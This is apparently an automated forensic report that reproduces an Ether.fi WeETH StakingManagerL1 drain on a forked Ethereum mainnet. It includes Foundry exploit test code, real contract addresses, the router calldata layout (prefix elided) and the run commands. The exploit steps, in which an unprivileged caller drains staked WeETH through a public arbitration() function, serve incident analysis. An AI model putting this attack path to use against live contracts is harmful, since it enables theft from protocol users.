## Overview & Context

This proof-of-concept (PoC) reconstructs the Ether.fi WeETH / StakingManagerL1 incident on an Ethereum mainnet fork. In the original attack, an unprivileged externally owned account (EOA) called a public router function `arbitration()` which, via a UUPS proxy to `StakingManagerL1`, drained the staking manager’s entire WeETH balance, swapped it through a Uniswap V3 WeETH–WETH pool, unwrapped WETH to ETH via WETH9, and delivered the proceeds to the attacker. The root cause is a protocol-level authorization bug: a powerful full-balance withdrawal path is exposed through a public router entrypoint without adequate caller or ownership checks.

The PoC demonstrates this exact drain path on a forked Ethereum mainnet state taken immediately before the incident block. It shows that any funded, unprivileged EOA can drive the same call sequence and realize ETH profit by triggering `router.arbitration()` with appropriately structured calldata, even though they do not own the WeETH held by the staking manager proxy.

**Command to run the PoC**

```bash
cd forge_poc
RPC_URL="<RPC_URL>" forge test --via-ir -vvvvv
```

The `RPC_URL` environment variable must be configured to point to an Ethereum mainnet RPC endpoint (in this environment it is injected from a QuickNode template via `.env`). The test suite then forks mainnet at the pre-incident block, executes the exploit, and prints a detailed trace including state diffs.

---

## PoC Architecture & Key Contracts

The PoC is implemented as a single Foundry test contract `WeEthStakingManagerExploitTest` in `test/Exploit.t.sol`. It uses only real mainnet contracts and a fresh attacker address.

**Key contracts and addresses (mainnet)**

- `StakingManagerL1` proxy (victim vault): `0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525`
- Router exposing `arbitration()` (public entrypoint): `0x1a61249F6f4F9813C55Aa3b02C69438607272ED3`
- WeETH token: `0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee`
- WETH9 token: `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
- Uniswap V3 WeETH–WETH pool: `0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93`
- Attacker (test-only address): derived via `makeAddr("attacker")`, not the real incident EOA.

The test defines these as constants and labels them using Foundry’s `vm.label` for readability.

```solidity
// From test/Exploit.t.sol: main contract and address configuration
address constant STAKING_MANAGER_L1_PROXY = 0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525;
address constant ROUTER = 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3;
address constant WE_ETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_WEETH_WETH_POOL = 0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93;
```

*Snippet 1 — Mainnet contract wiring used by the PoC test.*

### Adversary and helper logic

- **Adversary identity**: A fresh attacker address is created via `makeAddr("attacker")`, funded with `1 ether`, and used for all exploit calls. This avoids relying on the original attacker EOA while still exercising the same authorization flaws.
- **Token interfaces**: A minimal `IERC20` interface is used for `balanceOf` checks on WeETH and WETH.
- **No mocks**: The PoC interacts directly with mainnet contracts on the fork; no local mocks or stand-in contracts are deployed.

### Exploit logic

The exploit logic is concentrated in two functions:

- `_buildArbitrationCalldata()` reconstructs the router’s `arbitration()` payload observed in the incident trace, but replaces the final recipient address with the PoC’s attacker.
- `_runExploit()` snapshots pre-state balances, executes the router call as the attacker, and snapshots post-state balances for oracle checks.

```solidity
// From test/Exploit.t.sol: reconstruction of arbitration() calldata
function _buildArbitrationCalldata() internal view returns (bytes memory) {
    // Prefix and suffix reproduced from the incident trace; recipient slot is
    // rebound to the test attacker so the PoC is self-contained.
    bytes memory prefix = hex"..."; // WeETH -> Uniswap V3 -> WETH9 path
    bytes memory suffix = hex"0906357ab8a4af56886c0000";

    return abi.encodePacked(bytes4(0x9b732350), prefix, bytes20(attacker), suffix);
}
```

*Snippet 2 — Arbitration calldata reconstructed from the incident trace with the recipient switched to the test attacker.*

---

## Adversary Execution Flow

The PoC closely mirrors the ACT sequence from the root cause analysis: starting from a pre-incident fork, a single attacker-crafted transaction drains the staking manager’s WeETH and realizes ETH profit.

### 1. Funding and environment setup

The `setUp()` function forks Ethereum mainnet at block `22855568` (one block before the incident) and configures the testing environment:

- Reads `RPC_URL` from the environment.
- Calls `vm.createFork(rpcUrl, 22855568)` and `vm.selectFork(forkId)`.
- Warps the timestamp to align with the incident block.
- Creates and funds a fresh attacker address with `1 ether`.
- Labels all key contracts and tokens for readable traces.
- Executes oracle pre-checks to ensure the environment matches the intended opportunity.

```solidity
// From test/Exploit.t.sol: environment setup and pre-checks
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createFork(rpcUrl, 22855568);
    vm.selectFork(forkId);

    vm.warp(1751749415);
    attacker = makeAddr("attacker");
    deal(attacker, 1 ether);

    uint256 weEthBalanceBefore = weEthToken.balanceOf(STAKING_MANAGER_L1_PROXY);
    assertGt(weEthBalanceBefore, 0, "pre: staking manager must hold WeETH");

    uint256 poolWeEthBalanceBefore = weEthToken.balanceOf(UNISWAP_WEETH_WETH_POOL);
    assertGt(poolWeEthBalanceBefore, 0, "pre: pool must hold WeETH");

    uint256 wethEthBackingBeforeLocal = address(WETH).balance;
    assertGt(wethEthBackingBeforeLocal, 0, "pre: WETH9 must hold ETH backing");
}
```

*Snippet 3 — Mainnet fork setup and oracle pre-checks for staking manager, pool, and WETH9.*

### 2. Exploit execution

The exploit is executed by `_runExploit()` and invoked from `testExploit()`:

1. Snapshot pre-exploit balances:
   - `attackerEthBefore = attacker.balance`
   - `stakingWeEthBefore = weEthToken.balanceOf(STAKING_MANAGER_L1_PROXY)`
   - `wethEthBackingBefore = address(WETH).balance`
2. Build the arbitration calldata using the reconstructed payload.
3. Start a prank as the attacker (`vm.startPrank(attacker, attacker)`).
4. Call the router with the crafted data: `(bool success, ) = ROUTER.call(data);`.
5. Require that the call does not revert (hard constraint HC-2).
6. Stop the prank and snapshot post-exploit balances.

```solidity
// From test/Exploit.t.sol: main exploit driver
function _runExploit() internal {
    attackerEthBefore = attacker.balance;
    stakingWeEthBefore = weEthToken.balanceOf(STAKING_MANAGER_L1_PROXY);
    wethEthBackingBefore = address(WETH).balance;

    bytes memory data = _buildArbitrationCalldata();

    vm.startPrank(attacker, attacker);
    (bool success, ) = ROUTER.call(data);
    vm.stopPrank();

    require(success, "router.arbitration() must not revert");

    attackerEthAfter = attacker.balance;
    stakingWeEthAfter = weEthToken.balanceOf(STAKING_MANAGER_L1_PROXY);
    wethEthBackingAfter = address(WETH).balance;
}
```

*Snippet 4 — Executing router.arbitration() as an unprivileged attacker and collecting balances for checks.*

The forge trace confirms this flow on the forked state, reproducing the same delegatecall into `StakingManagerL1` and subsequent Uniswap V3 and WETH9 interactions observed in the live incident.

### 3. Profit realization and assertions

The public test function `testExploit()` calls `_runExploit()` and enforces all oracle constraints:

1. **HC-1 — Full WeETH drain**: The staking manager proxy’s WeETH balance must be fully drained to zero.
2. **SC-1 — Attacker net ETH profit**: The attacker’s ETH balance must strictly increase after the exploit.
3. **SC-2 — Victim WeETH depletion**: The staking manager’s WeETH balance must strictly decrease.
4. **SC-3 — WETH9 ETH backing decrease**: WETH9’s ETH balance must strictly decrease due to unwrapping.

```solidity
// From test/Exploit.t.sol: main test and oracle checks
function testExploit() public {
    _runExploit();

    assertEq(
        stakingWeEthAfter,
        0,
        "StakingManagerL1 WeETH balance should be fully drained to zero after exploit"
    );

    assertGt(
        attackerEthAfter,
        attackerEthBefore,
        "attacker must have strictly more ETH after exploit, net of gas"
    );

    assertLt(
        stakingWeEthAfter,
        stakingWeEthBefore,
        "StakingManagerL1 WeETH balance must strictly decrease during exploit"
    );

    assertLt(
        wethEthBackingAfter,
        wethEthBackingBefore,
        "WETH9 ETH backing must strictly decrease due to unwrapping to attacker"
    );
}
```

*Snippet 5 — End-to-end exploit test enforcing hard and soft oracle constraints.*

---

## Oracle Definitions and Checks

The PoC is explicitly aligned with `artifacts/poc/oracle_generator/oracle_definition.json`, which defines:

### Variables

- **attacker**: An unprivileged EOA representing the adversary. The PoC uses a fresh `makeAddr("attacker")` instance instead of the historical EOA.
- **stakingManagerL1Proxy**: The victim contract that initially holds the WeETH being drained.
- **router**: The public entrypoint exposing `arbitration()` that orchestrates the exploit.
- **weEthToken**: The WeETH ERC20 token held by the staking manager and moved through the Uniswap pool.
- **wethToken**: The WETH9 contract used to unwrap into ETH.
- **uniswapWeEthWethPool**: The Uniswap V3 pool providing WeETH–WETH liquidity.
- **ETH**: The reference asset for the attacker’s profit.

These entities are all bound to their mainnet addresses in the test and used in labels and balance checks.

### Pre-checks

The oracle specifies three pre-conditions, all implemented in `setUp()`:

1. **Staking manager WeETH balance positive**  
   - Oracle: stakingManagerL1 proxy must hold a positive WeETH balance before the exploit.  
   - PoC: `weEthToken.balanceOf(STAKING_MANAGER_L1_PROXY) > 0` with an assertion message `"pre: staking manager must hold WeETH"`.

2. **Uniswap WeETH–WETH pool WeETH liquidity positive**  
   - Oracle: pool must have enough WeETH liquidity to accept the swap.  
   - PoC: `weEthToken.balanceOf(UNISWAP_WEETH_WETH_POOL) > 0` with message `"pre: pool must hold WeETH"`.

3. **WETH9 ETH backing positive**  
   - Oracle: WETH9 must hold enough ETH to unwrap WETH without reverting.  
   - PoC: `address(WETH).balance > 0` with message `"pre: WETH9 must hold ETH backing"`.

If any of these fail, the test reverts before running the exploit, ensuring the ACT opportunity is present.

### Hard constraints

1. **HC-1 — WeETH fully drained from staking manager**  
   - Oracle: WeETH balance of `stakingManagerL1Proxy` must be `0` after the exploit.  
   - PoC: After `_runExploit()`, asserts `stakingWeEthAfter == 0` with a clear message.

2. **HC-2 — `router.arbitration()` succeeds from an unprivileged attacker**  
   - Oracle: Calling `router.arbitration()` from the attacker must not revert.  
   - PoC: `_runExploit()` wraps the router call in `require(success, "router.arbitration() must not revert");` after `vm.startPrank(attacker, attacker)`.

### Soft constraints

1. **SC-1 — Attacker net ETH profit**  
   - Oracle: Attacker’s ETH balance must strictly increase after the exploit.  
   - PoC: `assertGt(attackerEthAfter, attackerEthBefore, ...)` directly enforces this.

2. **SC-2 — Staking manager WeETH balance strictly decreases**  
   - Oracle: WeETH balance of `stakingManagerL1Proxy` must strictly decrease.  
   - PoC: `assertLt(stakingWeEthAfter, stakingWeEthBefore, ...)` confirms that some WeETH is drained from the victim.

3. **SC-3 — WETH9 ETH backing strictly decreases**  
   - Oracle: WETH9’s ETH balance must strictly decrease due to unwrapping WETH.  
   - PoC: `assertLt(wethEthBackingAfter, wethEthBackingBefore, ...)` verifies that ETH leaves WETH9 backing during the exploit.

Taken together, these checks ensure the PoC is not only functionally successful but semantically consistent with the economic and state-transition behavior specified by the oracle definition.

---

## Validation Result and Robustness

The PoC validator executes the Forge tests with:

```bash
cd /home/wesley/TxRayExperiment/incident-202601011613/forge_poc
RPC_URL="<RPC_URL>" forge test --via-ir -vvvvv \
  > /home/wesley/TxRayExperiment/incident-202601011613/artifacts/poc/poc_validator/forge-test.log 2>&1
```

The test suite output shows:

- One test suite `WeEthStakingManagerExploitTest` executed.
- One test `testExploit()` passed.
- No failed or skipped tests.
- Detailed traces confirm that the execution path matches the incident’s router → staking manager proxy → WeETH → Uniswap V3 pool → WETH9 → attacker flow.

The validator’s structured result is saved at:

```json
{
  "overall_status": "Pass",
  "artifacts": {
    "validator_test_log_path": "/home/wesley/TxRayExperiment/incident-202601011613/artifacts/poc/poc_validator/forge-test.log"
  }
}
```

*Snippet 6 — Summary of the validator’s Pass decision and log location (full JSON stored on disk).*

**Robustness assessment**

- The PoC runs on a forked mainnet state at the precise pre-incident block, ensuring realistic liquidity, balances, and contract code.
- It uses a fresh attacker address and reconstructs the router calldata in-line, avoiding dependency on external attacker artifacts while still matching the incident semantics.
- All oracle pre-checks, hard constraints, and soft constraints are enforced and pass, providing strong evidence that the PoC faithfully captures the exploit conditions.

The validator therefore concludes that the PoC passes all defined oracles and meets the required quality criteria.

---

## Linking PoC Behavior to Root Cause

The root cause report describes a protocol bug in which a public router function `arbitration()` exposes a powerful `StakingManagerL1` function (selector `0x03b79c24`) without sufficient access control. This allows any funded EOA to:

1. Trigger a full-balance WeETH withdrawal from the `StakingManagerL1` proxy.
2. Swap the withdrawn WeETH for WETH via the Uniswap V3 WeETH–WETH pool.
3. Unwrap the WETH to ETH in WETH9.
4. Receive the resulting ETH into the attacker’s EOA.

### Exercising the vulnerable logic

The PoC explicitly drives this same logic:

- **Router arbitration call**: `_buildArbitrationCalldata()` and `_runExploit()` construct and send a router call with selector `0x9b732350` (the `arbitration()` function) from the attacker address.
- **StakingManagerL1 delegatecall**: Forge traces show a delegatecall from the router into the `StakingManagerL1` implementation at selector `0x03b79c24`, reading and transferring the full WeETH balance from the proxy.
- **Uniswap V3 swap**: The trace records a `swap()` call on the WeETH–WETH pool that pulls exactly the WeETH amount drained from the staking manager and returns WETH.
- **WETH9 withdrawal**: WETH9’s `withdraw()` is invoked to unwrap WETH into ETH, reducing WETH9’s ETH backing.
- **Attacker credit**: The final ETH flows to the test attacker address, increasing its balance and satisfying the profit oracle.

### Demonstrating victim loss and adversary gain

The PoC’s assertions directly map to the ACT framing:

- **Victim depletion (C in ACT)**  
  - `stakingWeEthAfter == 0` and `stakingWeEthAfter < stakingWeEthBefore` show that the staking manager’s WeETH is fully drained.  
  - `wethEthBackingAfter < wethEthBackingBefore` shows that WETH9’s ETH backing decreases as part of the exploit.

- **Adversary-crafted transaction (A in ACT)**  
  - The call originates from a fresh attacker EOA using `vm.startPrank(attacker, attacker)` and a carefully constructed `arbitration()` payload, matching the adversary-crafted nature of the incident transaction.

- **Profit predicate (T in ACT)**  
  - `attackerEthAfter > attackerEthBefore` enforces the net ETH profit condition, the same success predicate used in the root cause analysis (though the exact magnitude may differ).

### Roles and responsibilities

- **Adversary**: The test’s attacker address stands in for the original EOA, demonstrating that any unprivileged user can realize the same profit.
- **Victim**: The `StakingManagerL1` proxy holds WeETH on behalf of protocol users; its full-balance drain represents the primary economic loss.
- **Infrastructure**: The Uniswap V3 pool and WETH9 contract are standard liquidity and wrapping components; their correct operation is abused but not faulty. The router and staking manager logic are where the authorization bug resides.

By reproducing the transaction-level behavior on a forked mainnet state and satisfying the oracle-based success criteria, this PoC provides concrete, executable evidence that the root cause analysis is correct: exposing the staking manager’s full-balance withdrawal path through a public router function without adequate access control enables deterministic, profitable theft of protocol-held WeETH.

